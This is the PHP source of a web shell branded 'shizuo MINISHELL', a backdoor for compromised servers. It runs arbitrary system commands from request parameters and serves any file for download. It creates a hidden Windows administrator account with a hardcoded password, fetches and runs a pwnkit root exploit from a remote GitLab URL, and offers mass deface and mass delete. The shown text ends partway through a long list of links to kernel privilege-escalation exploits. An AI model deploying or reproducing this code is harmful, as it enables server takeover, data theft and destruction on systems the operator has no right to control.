<?php
session_start();
set_time_limit(0);
error_reporting(0);
@ini_set('error_log',null);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
$_7 = array_merge($_POST, $_GET);
$_r = "required='required'";
$gcw = "getcwd";
// login
// download file
if(isset($_7['opn']) && ($_7['opn'] != '') && ($_7['action'] == 'download')){
	@ob_clean();
	$file = $_7['opn'];
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.basename($file).'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
}
function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<rd>".$perm."</rd>";
	} else {
		return "<gr>".$perm."</gr>";
	}
}
function s(){
	echo '<style>table{display:none;}</style><div class="table-responsive"><center><hr></hr></center></div>';
}
function ok(){
	echo '<div class="alert alert-success alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
}
function er(){
	echo '<div class="alert alert-dark alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
}
function sz($byt){
	$typ = array('B', 'KB', 'MB', 'GB', 'TB');
	for($i = 0; $byt >= 1024 && $i < (count($typ) -1 ); $byt /= 1024, $i++ );
	return(round($byt,2)." ".$typ[$i]);
}
function ia() {
	$ia = '';
if (getenv('HTTP_CLIENT_IP'))
	$ia = getenv('HTTP_CLIENT_IP');
else if(getenv('HTTP_X_FORWARDED_FOR'))
	$ia = getenv('HTTP_X_FORWARDED_FOR');
else if(getenv('HTTP_X_FORWARDED'))
	$ia = getenv('HTTP_X_FORWARDED');
else if(getenv('HTTP_FORWARDED_FOR'))
	$ia = getenv('HTTP_FORWARDED_FOR');
else if(getenv('HTTP_FORWARDED'))
	$ia = getenv('HTTP_FORWARDED');
else if(getenv('REMOTE_ADDR'))
	$ia = getenv('REMOTE_ADDR');
else
	$ia = 'Unknown IP';
return $ia;
}
function exe($cmd) {
if(function_exists('system')) {
	@ob_start();
	@system($cmd);
	$buff = @ob_get_contents();
	@ob_end_clean();
	return $buff;
} elseif(function_exists('exec')) {
	@exec($cmd,$results);
	$buff = "";
foreach($results as $result) {
	$buff .= $result;
	} return $buff;
} elseif(function_exists('passthru')) {
	@ob_start();
	@passthru($cmd);
	$buff = @ob_get_contents();
	@ob_end_clean();
	return $buff;
} elseif(function_exists('shell_exec')) {
	$buff = @shell_exec($cmd);
	return $buff;
	}
}
function exe_root($set,$sad) {
	$x = "preg_match";
	$xx = "2>&1";
	if (!$x("/".$xx."/i", $set)) {
		$set = $set." ".$xx;
	}
	$a = "function_exists";
	$b = "proc_open";
	$c = "htmlspecialchars";
	$d = "stream_get_contents";
	if ($a($b)) {
		$ps = $b($set, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $pink,$sad);
		return $d($pink[1]);
	} else {
		return "proc_open function is disabled!";
	}
}
function p($file){
$p = fileperms($file);
if (($p & 0xC000) == 0xC000) {
$i = 's';
} elseif (($p & 0xA000) == 0xA000) {
$i = 'l';
} elseif (($p & 0x8000) == 0x8000) {
$i = '-';
} elseif (($p & 0x6000) == 0x6000) {
$i = 'b';
} elseif (($p & 0x4000) == 0x4000) {
$i = 'd';
} elseif (($p & 0x2000) == 0x2000) {
$i = 'c';
} elseif (($p & 0x1000) == 0x1000) {
$i = 'p';
} else {
$i = 'u';
	}
$i .= (($p & 0x0100) ? 'r' : '-');
$i .= (($p & 0x0080) ? 'w' : '-');
$i .= (($p & 0x0040) ?
(($p & 0x0800) ? 's' : 'x' ) :
(($p & 0x0800) ? 'S' : '-'));
$i .= (($p & 0x0020) ? 'r' : '-');
$i .= (($p & 0x0010) ? 'w' : '-');
$i .= (($p & 0x0008) ?
(($p & 0x0400) ? 's' : 'x' ) :
(($p & 0x0400) ? 'S' : '-'));
$i .= (($p & 0x0004) ? 'r' : '-');
$i .= (($p & 0x0002) ? 'w' : '-');
$i .= (($p & 0x0001) ?
(($p & 0x0200) ? 't' : 'x' ) :
(($p & 0x0200) ? 'T' : '-'));
return $i;
}
if(isset($_7['dir'])) {
	$dir = $_7['dir'];
	chdir($dir);
} else {
	$dir = $gcw();
}
echo "
<html>
	<head>
		<meta charset='utf-8'>
		<meta name='author' content='Shizuo1337'>
		<meta name='viewport' content='width=device-width, initial-scale=0.40'>
		<link rel='icon' href='//i.ibb.co/mbRDLgS/cat-logo-E6-BC30-BEB2-seeklogo-com-removebg-preview.png'>
		<title>Shizuo1337</title>
		<script src='//cdnjs.cloudflare.com/ajax/libs/prism/1.6.0/prism.js'></script>
		<script src='//cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js'></script>
		<script src='//code.jquery.com/jquery-3.3.1.slim.min.js'></script>
		<style>@import url('//cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css');@import url('//cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css');@import url('//cdnjs.cloudflare.com/ajax/libs/prism/1.6.0/themes/prism-okaidia.css');@import url('https://fonts.googleapis.com/css2?family=Ubuntu+Condensed');@import url('https://fonts.googleapis.com/css2?family=Sedgwick+Ave&display=swap');@import url('https://fonts.googleapis.com/css2?family=Cormorant');body {cursor: url('data:image/x-icon;base64,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'), auto;font-family:'Ubuntu Condensed';}.shell{border-radius: 4px;border: 1px solid rgba(255, 255, 255, 0.4);font-size: 10pt;display: flex;flex-direction: column;align-items: stretch;background: #242424;color: #fff;}.pre{height: 150px;overflow: auto;white-space: pre-wrap;flex-grow: 1;margin:10px auto;padding:10px;line-height:1.3em;overflow-x:scroll;}.anu,kbd{font-family: 'Sedgwick Ave', cursive;}.corner{text-align: right;margin-top: -10px;font-size:12px;}gr {color:#54A700;}rd {color:red;}.php_info pre {margin: 0; font-family: monospace;}.php_info table {color: #000; border-collapse: collapse; border: 0; width: 934px; box-shadow: 1px 2px 3px #ccc;}.center {text-align: center;}.center table {margin: 1em auto; text-align: left;}.center th {text-align: center !important;}.php_info td, th {border: 1px solid #666; font-size: 75%; vertical-align: baseline; padding: 4px 5px;}.p {text-align: left;}.e {background-color: #ccf; width: 300px; font-weight: bold;}.h {background-color: #99c; font-weight: bold;}.v {background-color: #ddd; max-width: 300px; overflow-x: auto; word-wrap: break-word;}.v i {color: #999;}img {float: right; border: 0;}hr {width: 934px; background-color: #ccc; border: 0; height: 1px;}h1 {font-size: 150%;}h2 {font-size: 125%;}</style>
	</head>
<body class='bg-secondary text-light'>
<div class='container-fluid'>
	<div class='py-3' id='main'>
		<div class='box shadow bg-dark p-4 rounded-3'>
			<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h1>shizuo MINISHELL</h1></a>";
			if(isset($_7['path'])){
				$path = $_7['path'];
				chdir($path);
			}else{
				$path = $gcw();
			}
				$path = str_replace('\\','/',$path);
				$paths = explode('/',$path);
			foreach($paths as $id=>$pat){
			if($pat == '' && $id == 0){
				$a = true;
					echo "<i class='bi bi-hdd-rack'></i>:<a class='text-decoration-none text-light' href='?path=/'>/</a>";
				continue;
			}
			if($pat == '') continue;
				echo "<a class='text-decoration-none text-light' href='?path=";
				for($i=0;$i<=$id;$i++){
				echo "$paths[$i]";
			if($i != $id) echo "/";
			}
			echo "'>".$pat."</a>/";
			}
			$scand = scandir($path);
			echo "&nbsp;[ ".w($path, p($path))." ]";
			// info
			$sql = (function_exists('mysql_connect')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
			$curl = (function_exists('curl_version')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
			$wget = (exe('wget --help')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
			$pl = (exe('perl --help')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
			$py = (exe('python --help')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
			$gcc = (exe('gcc --help')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
			$pkexec = (exe('pkexec --version"')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
			$disfunc = @ini_get("disable_functions");
			if (empty($disfunc)) {
				$disfc = "<gr>NONE</gr>";
			} else {
				$disfc = "<rd>$disfunc</rd>";
			}
			if(!function_exists('posix_getegid')) {
				$user = @get_current_user();
				$uid = @getmyuid();
				$gid = @getmygid();
				$group = "?";
			} else {
				$uid = @posix_getpwuid(posix_geteuid());
				$gid = @posix_getgrgid(posix_getegid());
				$user = $uid['name'];
				$uid = $uid['uid'];
				$group = $gid['name'];
				$gid = $gid['gid'];
			}
			$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<rd>ON</rd>" : "<gr>OFF</gr>";
		echo "
		<div class='container-fluid'>
			<div class='corner'>
				<i data-bs-toggle='collapse' data-bs-target='#collapseExample' aria-expanded='false' aria-controls='collapseExample'>Information Server</i>
				<!--<form method=post><select name=eviltwin><option selected>Get Localroot All CVE</option><option value=one>CVE-2018-14634 (2.6.x, 3.10.x and 4.14.x)</option><option value=two>Dirty</option><option value=suid>Suid</option><option value=timoutpwn>Timeoutpwn</option><option value=alfa>Alfa (4)</option><option value=noname>Noname (1)</option><option value=ets>Evil Twin (1.3)</option></select><input type=submit value=Get!>-->
			</div><br>
			<div class='collapse text-dark mb-3' id='collapseExample'>
				<div class='box shadow bg-light p-3 rounded-3'>
				System: <gr>".php_uname()."</gr><br>
				Software: <gr>".$_SERVER["SERVER_SOFTWARE"]."</gr><br>
				PHP Version: <gr>".PHP_VERSION."</gr> PHP Os: <gr>".PHP_OS."</gr><br>
				Server IP: <gr>".gethostbyname($_SERVER['HTTP_HOST'])."</gr><br>
				Your IP: <gr>".ia()."</gr><br>
				User: <gr>$user</gr> ($uid) | Group: <gr>$group</gr> ($gid)<br>
				Safe Mode: $sm<br>
				MYSQL: $sql | PERL: $pl | PYTHON: $py | WGET: $wget | CURL: $curl | GCC: $gcc | PKEXEC: $pkexec<br>
				Disable Function:<br><pre>$disfc</pre>
				</div>
			</div>
		</div>
		<div class='text-center'>
			<div class='btn-group'>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=adminer'><i class='bi bi-cast'></i> Adminer </a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=autoroot'><i class='bi bi-bug'></i> Auto Root </a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=cmd'><i class='bi bi-terminal'></i> Command </a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=rdp'><i class='bi bi-intersect'></i> Create RDP </a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=config'><i class='bi bi-tv'></i> Config </a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=getools'><i class='bi bi-toggles'></i> Get Shell/Tools </a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=getroot'><i class='bi bi-tools'></i> Get Localroot </a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=deface'><i class='bi bi-exclamation-diamond'></i> Mass Deface </a>
				<a class='btn btn-outline-danger btn-sm' href='?dir=$path&id=delete'><i class='bi bi-trash'></i> Mass Delete </a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=network'><i class='bi bi-hdd-network'></i> Network </a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=scanroot'><i class='bi bi-search'></i> Scan Root </a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=upload'><i class='bi bi-upload'></i> Upload </a>
				<a class='btn btn-outline-light btn-sm' href='https://shizuo.my.id'><i class='bi bi-box-arrow-in-left'></i> Website </a>
			</div>
		</div>";
		$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);
		// tools
		if(isset($_7['dir'])) {
			$dir = $_7['dir'];
			chdir($dir);
		} else {
			$dir = $gcw();
		}
		$path = str_replace('\\','/',$path);
		$scdir = explode("/", $dir);	
		for($i = 0; $i <= $c_dir; $i++) {
			$scdir[$i];
			if($i != $c_dir) {
		}
		// create rdp
		if($_7['id'] == 'rdp'){
		ob_implicit_flush();ob_end_flush();
		if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
		echo '<center class="anu">Create RDP</center>';
				echo '
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
						<pre style="font-size:10px;"><code>'.exe_root("net user shizuo b4b1raga#1337 /add", $path).exe_root("net localgroup administrators shizuo /add", $path).'<br>If there is no "Access is denied." output, chances are that you have succeeded in creating a user here. Just log in using the username and password below.
hosts: <gr>'.gethostbyname($_SERVER["HTTP_HOST"]).'
username: shizuo
password: b4b1raga#1337</code></pre>
					</div>
				</div>';}
				else{ echo "<script>alert('Whutt?! kids, this tool only works for windows server!');</script>"; }
			}
		// auto root
		if($_7['id'] == 'autoroot'){
		ob_implicit_flush();ob_end_flush();
		echo '<center class="anu">Auto Root by shizuo</center>';
				echo '
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
						<pre style="font-size:10px;"><code>'.exe_root("curl https://gitlab.com/jasonrondiguez/a/-/raw/main/localr00000t/pwnkit -o cats;chmod +x cats;./cats id", $path).'<br>If successful, u can run as root user using command: ./cats "YOUR COMMAND"</code></pre>
					</div>
				</div>';
			}
				// get localroot
		if($_7['id'] == 'getroot'){
		ob_implicit_flush();ob_end_flush();s();
		echo '<center class="anu">Get Localroot</center>';
		echo "<b>Linux</b><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2001' class='text-decoration-none text-light'>CVE N/A | Sudo prompt overflow in v1.5.7 to 1.6.5p2</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2002' class='text-decoration-none text-light'>CVE-2003-0961 | Linux Kernel 2.4.22 - 'do_brk()' Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/blob/master/2003/ptrace-kmod.c' class='text-decoration-none text-light'>CVE-2003-0127 | Linux Kernel 2.2.x/2.4.x (RedHat) - 'ptrace/kmod' Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/blob/master/2003/hatorihanzo.c' class='text-decoration-none text-light'>CVE-2003-0961 | Linux Kernel 2.4.22 - 'do_brk()' Local Privilege Escalation (2)</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2004/CVE-2004-0077' class='text-decoration-none text-light'>CVE-2004-0077 | Linux Kernel 2.2.25/2.4.24/2.6.2 - 'mremap()' Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2004/CVE-2004-1235' class='text-decoration-none text-light'>CVE-2004-1235 | Linux Kernel 2.4.29-rc2 - 'uselib()' Local Privilege Escalation (1)</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2004/caps_to_root' class='text-decoration-none text-light'>CVE N/A | Linux Kernel < 2.6.34 (Ubuntu 10.10 x86) - 'CAP_SYS_ADMIN' Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2005/CVE-2005-0736' class='text-decoration-none text-light'>CVE-2005-0736 | Linux Kernel 2.6.9 < 2.6.11 (RHEL 4) - 'SYS_EPoll_Wait' Local Integer Overflow / Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2005/CVE-2005-1263' class='text-decoration-none text-light'>CVE-2005-1263 | Linux Kernel 2.2.x/2.3.x/2.4.x/2.5.x/2.6.x - ELF Core Dump Local Buffer Overflow</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2006/CVE-2006-2451' class='text-decoration-none text-light'>CVE-2006-2451 | Linux Kernel 2.6.13 < 2.6.17.4 - 'logrotate prctl()' Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2006/CVE-2006-3626' class='text-decoration-none text-light'>CVE-2006-3626 | Linux Kernel 2.6.17.4 - 'proc' Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2007/Compress_Exploit' class='text-decoration-none text-light'>CVE N/A | Compress v4.2.4 local test exploit</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2007/Gawk_Exploit' class='text-decoration-none text-light'>CVE N/A | Local GNU Awk 3.1.0-x proof of concept exploit</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2007/EDB-ID-4756' class='text-decoration-none text-light'>EDB-ID-4756 | Linux Kernel < 2.6.11.5 Bluetooth Stack Localroot Exploit</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2008/CVE-2008-0600' class='text-decoration-none text-light'>CVE-2008-0600 | Linux Kernel 2.6.23 < 2.6.24 - 'vmsplice' Local Privilege Escalation (1)</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2008/CVE-2008-0900' class='text-decoration-none text-light'>CVE-2008-0900 | Linux Kernel 2.6.17 < 2.6.24.1 - 'vmsplice' Local Privilege Escalation (2)</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2008/CVE-2008-4210' class='text-decoration-none text-light'>CVE-2008-4210 | Linux Kernel < 2.6.22 - 'ftruncate()'/'open()' Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2009/CVE-2009-1185' class='text-decoration-none text-light'>CVE-2009-1185 | Linux Kernel 2.6 (Debian 4.0 / Ubuntu / Gentoo) UDEV < 1.4.1 - Local Privilege Escalation (1)</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2009/CVE-2009-1337' class='text-decoration-none text-light'>CVE-2009-1337 | Linux Kernel < 2.6.29 - 'exit_notify()' Local Privilege Escalation
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2009/CVE-2009-2692' class='text-decoration-none text-light'>CVE-2009-2692 | Linux Kernel 2.x (RedHat) - 'sock_sendpage()' Ring0 Privilege Escalation (1)</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2009/CVE-2009-2698' class='text-decoration-none text-light'>CVE-2009-2698 | Linux kernel 2.6 < 2.6.19 (32bit) ip_append_data() local ring0 root exploit</a><br>
